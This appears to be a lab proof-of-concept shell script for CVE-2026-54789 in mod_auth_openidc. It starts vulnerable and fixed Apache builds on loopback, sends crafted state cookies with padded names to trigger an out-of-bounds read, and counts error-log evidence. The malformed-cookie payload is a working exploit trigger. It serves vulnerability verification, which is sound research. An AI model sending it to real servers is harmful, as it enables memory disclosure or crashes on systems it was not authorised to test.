#!/usr/bin/env bash
# Wire-controlled NUL store probe for CVE-2026-54789.
# Uses the already-built full modules from BUILD.md; loopback only.
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
HTTPD=/home/mesh-home/mishe-tauftauf2shell/lab/frontier/apache2shell/build/httpd-2.4.71-asanapr-install/bin/httpd
URL=http://127.0.0.1:18090/protected
OUT="$HERE/evidence/store"
mkdir -p "$OUT"

sweep() {
    name="$1"; conf="$2"; errlog="$3"
    "$HTTPD" -f "$HERE/$conf" -k stop >/dev/null 2>&1
    sleep 1
    : > "$errlog"
    "$HTTPD" -f "$HERE/$conf" -k start >"$OUT/$name-start.out" 2>&1
    sleep 2
    for n in 1 4 8 16 32; do
        padding=$(printf 'z%.0s' $(seq 1 "$n"))
        value="V$n"
        code=$(curl -sS --max-time 8 -o /dev/null -w '%{http_code}' \
            -H "Cookie: mod_auth_openidc_state_novalue;${padding}=${value}" \
            "$URL" 2>/dev/null)
        printf '%s len=%s code=%s\n' "$name" "$n" "$code" >>"$OUT/codes.txt"
    done
    "$HTTPD" -f "$HERE/$conf" -k stop >/dev/null 2>&1
    sleep 1
    cp "$errlog" "$OUT/$name-error.log"
    dispatch=$(grep -c 'oidc_state_cookies_process_one' "$OUT/$name-error.log" || true)
    oob_value=$(grep -c 'could not parse first element separated by' "$OUT/$name-error.log" || true)
    printf '%s dispatch=%s oob_value_peek=%s\n' "$name" "$dispatch" "$oob_value"
}
: > "$OUT/codes.txt"
echo "state.c sha256: $(sha256sum "$HERE/src/mod_auth_openidc/src/state.c" | awk '{print $1}')" >"$OUT/summary.txt"
sweep vuln httpd-asan.conf "$HERE/error_log" >>"$OUT/summary.txt"
sweep fixed httpd-fixed.conf "$HERE/error-fixed.log" >>"$OUT/summary.txt"
cat "$OUT/summary.txt"
